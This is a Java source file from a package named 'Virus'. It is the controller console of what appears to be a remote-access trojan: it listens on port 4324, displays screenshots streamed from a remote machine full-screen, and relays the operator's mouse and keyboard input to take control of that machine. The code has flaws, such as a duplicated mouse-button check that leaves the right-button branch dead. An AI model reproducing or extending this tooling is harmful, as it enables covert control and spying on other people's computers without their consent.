package Virus;

import java.awt.Button;
import java.awt.Dimension;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.MouseMotionListener;
import java.awt.image.BufferedImage;
import java.awt.image.WritableRaster;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.LinkedList;
import java.util.Queue;

import javax.imageio.ImageIO;
import javax.imageio.stream.ImageInputStream;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class Viewer extends JFrame implements MouseListener, MouseMotionListener, KeyListener
{
	public static final int port = 4324;
	
	public static JLabel userScreen;
	
	public static ServerSocket server;
	public static Socket client;
	
	public static Viewer viewer;
	
	public static Robot robot;
	
	public static Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
	
	public static final int MAX_WIDTH = (int)size.getWidth();
	public static final int MAX_HEIGHT = (int)size.getHeight();
	
	public static timeout t;
	
	public static MouseController m;
	
	public Viewer()
	{
		this.setTitle("Viewer");
		this.setSize(MAX_WIDTH, MAX_HEIGHT);
		this.setDefaultCloseOperation(EXIT_ON_CLOSE);
		this.addMouseListener(this);
		this.addMouseMotionListener(this);
	    this.addKeyListener(this);
		this.setUndecorated(true);
		this.setVisible(true);
		
	    userScreen = new JLabel();
	    userScreen.addKeyListener(this);
	    userScreen.setSize((int)size.getWidth(), (int)size.getHeight());
	    this.add(userScreen);
	}
	
	public static class timeout extends Thread implements Runnable
	{
		int tickUntil = 5000;
		
		public timeout()
		{
			this.start();
		}
		
		public void reset()
		{
			tickUntil = 5000;
		}
		
		public void run()
		{
			try
			{
				while (tickUntil >= 0)
				{
					try
					{
						--tickUntil;
						this.sleep(2);
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
				}
				
				closeConnections();
				
				viewer.dispose();
				init();
				m.init();
			}
			catch (Exception e)
			{
				e.printStackTrace();
			}
		}
	}
	
	public static void init() throws Exception
	{
		System.out.println("Restarting...");
		
		t.reset();
		
		closeConnections();
		
		server = new ServerSocket(port);
		client = server.accept();
		
		System.out.println("Connected.");
		
	    viewer = new Viewer();
	    
	    m = new MouseController(viewer);
	    
	    int numDisconnect = 0;
	    
		while (true)
		{
		    ImageInputStream input = ImageIO.createImageInputStream(client.getInputStream());
		    BufferedImage img = ImageIO.read(input);
		    
		    if (img == null)
		    {
		    	++numDisconnect;
		    }
		    else
		    {
		    	Image scaledImg = img.getScaledInstance(MAX_WIDTH, MAX_HEIGHT, BufferedImage.SCALE_SMOOTH);
		    	
		    	t.reset();
		    	
		    	userScreen.setIcon(new ImageIcon(scaledImg));    	
			    viewer.repaint();
		    }
		    
		    if (numDisconnect >= 500)
		    {
				closeConnections();
				
				viewer.dispose();
				init();
				m.init();
		    }
		}
	} 
	
	public static void closeConnections() throws IOException
	{
		if (server != null) server.close();
		if (client != null) client.close();
			
		server = null;
		client = null;
	}
	
	public static void main(String args[])
	{
		try 
		{
			robot = new Robot();
			t = new timeout();
			
			init();
		} 
		catch (Exception e) 
		{
			e.printStackTrace();
		}
	}

	public void mouseClicked(MouseEvent e) 
	{
		if (e.getX() > MAX_WIDTH - 30 && e.getY() < 20)
		{
			System.exit(0);
		}
	}
	
	public void mouseMoved(MouseEvent e) 
	{
		try 
		{
			if (m != null) m.moveMouse(e.getX(), e.getY());
		} 
		catch (IOException e1) 
		{
			e1.printStackTrace();
		}
	}
	
	public void mouseDragged(MouseEvent e) 
	{
		try 
		{
			m.moveMouse(e.getX(), e.getY());
		} 
		catch (IOException e1) 
		{
			e1.printStackTrace();
		}
	}

	public void mousePressed(MouseEvent e) 
	{
		try 
		{
			if (e.getButton() == MouseEvent.BUTTON1)
			{
				m.MouseAction(1);
			}
			else if (e.getButton() == MouseEvent.BUTTON2)
			{
				m.MouseAction(2);
			}
			else if (e.getButton() == MouseEvent.BUTTON2)
			{
				m.MouseAction(3);
			}
		}
		catch (Exception e1)
		{
			e1.printStackTrace();
		}
	}

	public void mouseReleased(MouseEvent e) 
	{
		try 
		{
			if (e.getButton() == MouseEvent.BUTTON1)
			{
				m.MouseAction(4);
			}
			else if (e.getButton() == MouseEvent.BUTTON2)
			{
				m.MouseAction(5);
			}
			else if (e.getButton() == MouseEvent.BUTTON2)
			{
				m.MouseAction(6);
			}
		}
		catch (Exception e1)
		{
			e1.printStackTrace();
		}
	}
	
	public void keyTyped(KeyEvent e) 
	{
		try 
		{
			m.TypeKey(e.getKeyChar());
		}
		catch (Exception e1)
		{
			e1.printStackTrace();
		}
	}

	public void mouseEntered(MouseEvent e) {}

	public void mouseExited(MouseEvent e) {}

	public void keyPressed(KeyEvent e) {}

	public void keyReleased(KeyEvent e) {}
}
